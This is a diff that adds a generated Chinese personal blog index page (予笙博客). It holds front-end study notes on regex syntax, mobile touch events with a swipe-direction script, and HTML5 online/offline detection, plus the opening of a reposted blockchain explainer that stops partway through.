@@ -1,0 +1,2315 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+<title>予笙博客</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+    <meta property="og:type" content="website">
+<meta property="og:title" content="予笙博客">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="予笙博客">
+<meta property="og:locale" content="zh-CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="予笙博客">
+
+
+
+
+
+<link rel="icon" href="/images/favicon.svg">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.svg" alt="予笙博客" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item is-active" href="/">首页</a>
+                
+                <a class="navbar-item" href="/archives">档案</a>
+                
+                <a class="navbar-item" href="/categories">分类</a>
+                
+                <a class="navbar-item" href="/tags">标签</a>
+                
+                <a class="navbar-item" href="/about">关于</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="http://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main">
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-11-15T01:50:13.593Z">2018-11-15</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/前端/">前端</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    4 分钟 读完 (大约 657 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/11/15/正则表达式常用语法总结/">正则表达式常用语法总结</a>
+            
+        </h1>
+        <div class="content">
+            <blockquote>
+<p>正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本</p>
+</blockquote>
+<h2 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h2><ul>
+<li>字母、数字、标点符号、键盘特殊符号等</li>
+</ul>
+<h2 id="定义字符集"><a href="#定义字符集" class="headerlink" title="定义字符集"></a>定义字符集</h2><ol>
+<li>[a-z]            <strong>匹配 26 个字母之一</strong></li>
+<li>[aeiou]           <strong>匹配 aeiou 这 5 个字符其中的某一个字符</strong></li>
+<li>[a-zA-Z]       <strong>匹配 26 个(大小写)字母中的某一个字母</strong> </li>
+<li>[a-zA-Z0-9_-]  <strong>匹配(大小写)字母、数字、下划线、中横线 的某一个字符</strong></li>
+<li>[0-9]           <strong>匹配 0 到 9 之间任意一个数字</strong></li>
+<li>[9-3]  [z-a]  <strong>不能从大往小写，有语法错误</strong></li>
+</ol>
+<h2 id="shiy-特别字符集"><a href="#shiy-特别字符集" class="headerlink" title="shiy 特别字符集"></a>shiy 特别字符集</h2><ol>
+<li>$  <strong>匹配输入字符串的结尾位置（regexBuddy中待测试文本中多行算作一行）</strong></li>
+<li>^ (托字符)           <strong>匹配字符串的开始位置(托字符)</strong></li>
+<li>( )                <strong>匹配一个子表达式的开始和结束位置，模式单元</strong></li>
+<li>*            <strong>匹配其前面那个单元出现 0 次或以上（任意次数）</strong> </li>
+<li>+             <strong>匹配其前面那个单元出现 1 次或以上</strong> </li>
+<li>\?                  <strong>匹配其前面那个单元出现 0 次或 1 次</strong> </li>
+<li>.点                 <strong>匹配除换行符 \n 之外的任何单字符  .*</strong> </li>
+<li>\                  <strong>这个符号是用来转义的</strong> </li>
+<li>|                  <strong>指明两项之间的一个选择</strong> </li>
+</ol>
+<h2 id="组合字符集"><a href="#组合字符集" class="headerlink" title="组合字符集"></a>组合字符集</h2><ol>
+<li>\d                 <strong>匹配数字 0 到 9 之一，与[0-9]效果一样</strong> </li>
+<li>\D                 <strong>匹配非数字[^0-9]之一</strong> </li>
+<li>\w             <strong>匹配(大小写)字母、数字、下划线其中一个，与[a-zA-Z0-9_]效果相同</strong> </li>
+<li>\W                 <strong>匹配非字母、数字、下划线之一</strong> </li>
+<li>\s                 <strong>匹配一个空格</strong> </li>
+<li>\S                 <strong>匹配一个非空格</strong> </li>
+<li>\b                    <strong>匹配单词的开始或结束</strong> </li>
+</ol>
+<h2 id="限制字符集"><a href="#限制字符集" class="headerlink" title="限制字符集"></a>限制字符集</h2><ol>
+<li>{m}           <strong>匹配其前一单元严格出现 m 次</strong> </li>
+<li>{m,}            <strong>匹配其前一单元出现至少m次，至多不限制,{0,}相等于*，{1,}相等于+</strong> </li>
+<li>{m,n}   <strong>匹配其前一单元出现至少 m，至多 n 次</strong> </li>
+<li>[^lsjd]           <strong>匹配非 lsjd 之中的字符</strong> </li>
+<li>[^a-f]           <strong>匹配非 a 到 f 之间的一个字符</strong> </li>
+<li><strong>[^定义字符集] 不给匹配定义字符集里边的信息</strong></li>
+</ol>
+<h2 id="模式修正符"><a href="#模式修正符" class="headerlink" title="模式修正符"></a>模式修正符</h2><ol>
+<li>g  <strong>全文查找出现的所有 正在模式内容 （全局匹配） (php 中可以使用 preg_match_all()函数限制全局匹配)</strong> </li>
+<li>i  <strong>忽略大小写</strong> </li>
+<li>m <strong>将匹配内容视为多行</strong></li>
+<li>/u <strong>表示按 unicode(utf-8)匹配（主要针对多字节比如汉字）</strong></li>
+<li>/s <strong>表示将字符串视为单行来匹配</strong> </li>
+</ol>
+<h2 id="贪婪模式转非贪婪模式"><a href="#贪婪模式转非贪婪模式" class="headerlink" title="贪婪模式转非贪婪模式"></a>贪婪模式转非贪婪模式</h2><p><strong>通过在 *、+ 或 ? 限定符之后放置?，该表达式从”贪心”表达式转换为”非贪心”表达式或者最小匹配</strong></p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-11-15T01:50:13.589Z">2018-11-15</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/前端/">前端</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    4 分钟 读完 (大约 663 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/11/15/移动端事件详解/">移动端事件详解</a>
+            
+        </h1>
+        <div class="content">
+            <blockquote>
+<p>关于移动端事件的一些笔记</p>
+</blockquote>
+<h2 id="移动端事件类型"><a href="#移动端事件类型" class="headerlink" title="移动端事件类型"></a>移动端事件类型</h2><ol>
+<li>touchstart事件</li>
+<li>touchmove事件</li>
+<li>touchend事件</li>
+</ol>
+<h2 id="移动端事件对象"><a href="#移动端事件对象" class="headerlink" title="移动端事件对象"></a>移动端事件对象</h2><ol>
+<li>touches  屏幕上有几个触点</li>
+<li>targetTouches  绑定事件的元素上有几个触点</li>
+<li>changedTouches  在屏幕上 改变(位置移动 离开  进入 )的触点的个数(如果手指离开屏幕 只有changedTouched有值 其他都没有)</li>
+</ol>
+<h2 id="获取触点坐标"><a href="#获取触点坐标" class="headerlink" title="获取触点坐标"></a>获取触点坐标</h2><ol>
+<li>clientX/Y获取的是， 触点相对于可视区的X/Y坐标(不包含滚动)(用的最多)</li>
+<li>pageX/Y获取的是  ， 触点相对于HTML文档左边沿的的X/Y坐标(包含滚动)</li>
+<li>screenX/Y获取的是返回触点相对于屏幕左边沿的的X/Y坐标.不包含页面滚动的（screenX/Y有兼容性）</li>
+<li>细节: 如果想要clientX/YpageX/Y正确的结果,要写全viewport设置,如果写不全,那么不会得到正确的结果</li>
+</ol>
+<h2 id="300ms延迟"><a href="#300ms延迟" class="headerlink" title="300ms延迟"></a>300ms延迟</h2><ol>
+<li>形成原因：曾经移动端在萌芽阶段的时候，我们把PC端的网页放到了移动端，苹果公司把PC端的网页进行了缩放，发明了一种浏览缩放网页的处理方案 ，就是双击放大，第一次点击会延迟300ms左右，然后判断，如果有第二次点击，就是放大，如果没有，就是点击</li>
+<li>console.time(“timer”)计时器开</li>
+<li>console.timeEnd(‘timer’)计时器关</li>
+<li><strong>解决方法：</strong></li>
+<li>写上 viewport 设置就可以了</li>
+<li>用fastClick</li>
+</ol>
+<h2 id="移动端判断手指滑动方向"><a href="#移动端判断手指滑动方向" class="headerlink" title="移动端判断手指滑动方向"></a>移动端判断手指滑动方向</h2><ol>
+<li>获取到 触点起始点坐标</li>
+<li>获取到 触点 结束点坐标</li>
+<li>计算 坐标的差值的绝对值</li>
+<li>如果 水平坐标的差值的绝对值  大于竖直  就是水平滑动</li>
+<li>如果  终止点坐标减去起始点坐标大于0  那么是向 右  否则是向左滑</li>
+<li>如果 竖直坐标的差值的绝对值  大于水平  就是竖直滑动</li>
+<li>如果  终止点坐标减去起始点坐标大于0  那么是向 下  否则是向上滑</li>
+<li><strong>代码如下：</strong><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="hljs-string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="hljs-string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;meta name=<span class="hljs-string">"viewport"</span> content=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="hljs-string">"X-UA-Compatible"</span> content=<span class="hljs-string">"ie=edge"</span>&gt;</span><br><span class="line">  &lt;title&gt;Document&lt;<span class="hljs-regexp">/title&gt;</span></span><br><span class="line"><span class="hljs-regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    <span class="hljs-comment">// 1.声明变量</span></span><br><span class="line">    <span class="hljs-keyword">var</span> startX, startY, endX, endY, absX, absY;</span><br><span class="line">    <span class="hljs-comment">// 2.给document添加touchstart事件 </span></span><br><span class="line">    <span class="hljs-built_in">document</span>.addEventListener(<span class="hljs-string">"touchstart"</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) </span>&#123;</span><br><span class="line">      <span class="hljs-keyword">var</span> touches = e.targetTouches[<span class="hljs-number">0</span>];</span><br><span class="line"></span><br><span class="line">      startX = touches.clientX;</span><br><span class="line">      startY = touches.clientY;</span><br><span class="line"></span><br><span class="line">      <span class="hljs-comment">// console.log(startX, startY);</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// 3. 给document添加touchend事件</span></span><br><span class="line">    <span class="hljs-built_in">document</span>.addEventListener(<span class="hljs-string">"touchend"</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) </span>&#123;</span><br><span class="line">      <span class="hljs-keyword">var</span> touches = e.changedTouches[<span class="hljs-number">0</span>];</span><br><span class="line">      endX = touches.clientX;</span><br><span class="line">      endY = touches.clientY;</span><br><span class="line">      <span class="hljs-comment">// 4. 计算坐标差值的绝对值</span></span><br><span class="line">      absX = <span class="hljs-built_in">Math</span>.abs(endX - startX);</span><br><span class="line">      absY = <span class="hljs-built_in">Math</span>.abs(endY - startY);</span><br><span class="line"></span><br><span class="line">      <span class="hljs-keyword">if</span> (absX == absY) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="hljs-comment">// 5. 判断是水平还是垂直</span></span><br><span class="line">      <span class="hljs-comment">// 6. 如果是水平 判断左右</span></span><br><span class="line">      <span class="hljs-comment">// 7.如果是垂直 判断上下</span></span><br><span class="line">      <span class="hljs-keyword">var</span> direction = absX &gt; absY ?</span><br><span class="line">        endX - startX &gt; <span class="hljs-number">0</span> ? <span class="hljs-string">"向右"</span> : <span class="hljs-string">"向左"</span> :</span><br><span class="line">        endY - startY &gt; <span class="hljs-number">0</span> ? <span class="hljs-string">"向下"</span> : <span class="hljs-string">"向上"</span>;</span><br><span class="line">      <span class="hljs-built_in">console</span>.log(direction);</span><br><span class="line">    &#125;)</span><br><span class="line">  &lt;<span class="hljs-regexp">/script&gt;</span></span><br><span class="line"><span class="hljs-regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="hljs-regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-11-15T01:50:13.585Z">2018-11-15</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/生活/">生活</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    6 分钟 读完 (大约 851 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/11/15/学习笔记总结/">学习笔记总结</a>
+            
+        </h1>
+        <div class="content">
+            <blockquote>
+<p>快乐的时间总是短暂的，一转眼，我的学习已经过去了一年多了，期间也做了一些项目，每天感觉自己的进步，喜悦之情是难以克制的，现在把自己过去一年多以来学习做的笔记总结一下，这是我的学习路线，入门或者0基础的朋友可以看看，<strong>都是图片，加载不出来的朋友请挂梯子</strong></p>
+</blockquote>
+<p><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/1.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/2.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/3.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/4.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/5.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/6.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/7.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/8.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/9.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/10.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/11.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/12.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/13.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/14.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/15.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/16.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/17.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/18.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/19.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/20.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/21.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/22.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/23.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/24.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/25.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/26.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/27.png?raw=true" alt="image"><br><img src="https://github.com/tangchunwei/MyImage/blob/master/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/28.png?raw=true" alt="image"></p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-11-15T01:50:13.580Z">2018-11-15</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/前端/">前端</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    1 分钟 读完 (大约 155 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/11/15/网络状态检测/">html5之网络状态检测</a>
+            
+        </h1>
+        <div class="content">
+            <blockquote>
+<p>在原生APP中,比如QQ,它可以检测QQ是处于在线还是离线状态,但是在网页中,或者早期web app中,没有检测网络状态的能力,因此在HTML5中出现了网络状态检测API</p>
+</blockquote>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!--addEventListener() 方法用于向指定元素添加事件句柄。--&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-undefined"></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-comment">// online 在线</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">"online"</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;</span></span><br><span class="line"><span class="hljs-javascript">      alert(<span class="hljs-string">"您的网络状态正常"</span>);</span></span><br><span class="line"><span class="hljs-undefined">    &#125;)</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-comment">// offline 离线</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">"offline"</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;</span></span><br><span class="line"><span class="hljs-javascript">      alert(<span class="hljs-string">"您的网络状态离线"</span>);</span></span><br><span class="line"><span class="hljs-undefined">    &#125;)</span></span><br><span class="line"><span class="hljs-undefined"></span></span><br><span class="line"><span class="hljs-undefined"></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-comment">// 特殊情况</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-comment">// 局域网 显示正常</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-comment">// wifi有的时候标志有惊叹号  虽然不能上网 但是这个api也能用</span></span></span><br><span class="line"><span class="hljs-undefined">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-11-15T01:50:13.576Z">2018-11-15</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/Geek/">Geek</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    33 分钟 读完 (大约 4891 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/11/15/区块链分享/">区块链分享</a>
+            
+        </h1>
+        <div class="content">
+            <blockquote>
+<p>文章转载自薛国良老师的博客，<a href="http://www.xueguoliang.cn/index.php/archives/93/" target="_blank" rel="noopener">点击跳转</a></p>
+</blockquote>
+<h2 id="区块链行业现状"><a href="#区块链行业现状" class="headerlink" title="区块链行业现状"></a>区块链行业现状</h2><ul>
+<li>政府关注</li>
+<li>企业极力研究</li>
+<li>学术取得共识</li>
+<li>学校和培训机构设立学科</li>
+<li>资方积极参与</li>
+<li>争先恐后炒币</li>
+<li>技术不完善</li>
+<li>借区块链热点的传销和骗局横行</li>
+</ul>
+<p>区块链为什么会有如此魅力，让全社会都在关注它？区块链技术是本质是不可篡改的、去中心化的公开账本，是记账方式的进步。记账是社会生产生活的基石，记账方式的进步，能推动社会进步。</p>
+<h2 id="记账就是确权"><a href="#记账就是确权" class="headerlink" title="记账就是确权"></a>记账就是确权</h2><p>财富有各种各样的属性，最主要的属性，就是属于属性，也就是说这个财富是属于谁的。任何财富都有权利属于属性：</p>
+<ul>
+<li>纸币通过实物确权</li>
+<li>存款通过中心化银行记账确权</li>
+<li>房产则通过中心化政府颁发房产证确权</li>
+</ul>
+<h2 id="财富转移"><a href="#财富转移" class="headerlink" title="财富转移"></a>财富转移</h2><p>财富不流通没有价值，通过交易大家各取所需，才能过上幸福生活。每种财富转移方式，也跟确权方式紧密相连：</p>
+<ul>
+<li>纸币：通过传递实物货币转移</li>
+<li>存款：通过修改中心化账本转移</li>
+<li>房产：通过中心化政府办理过户手续，来进行财富转移</li>
+</ul>
+<h2 id="比特币价值"><a href="#比特币价值" class="headerlink" title="比特币价值"></a>比特币价值</h2><p>作为货币，比特币可以和现金、银行存款作比较。</p>
+<table>
+<thead>
+<tr>
+<th>比较</th>
+<th>现金</th>
+<th>中心化记账(银行)</th>
+<th>去中心化记账(比特币)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>确权</td>
+<td>实物确权</td>
+<td>中心化记账确权</td>
+<td>去中心化记账确权 </td>
+</tr>
+<tr>
+<td>转移</td>
+<td>需要面对面传递，受地理位置限制</td>
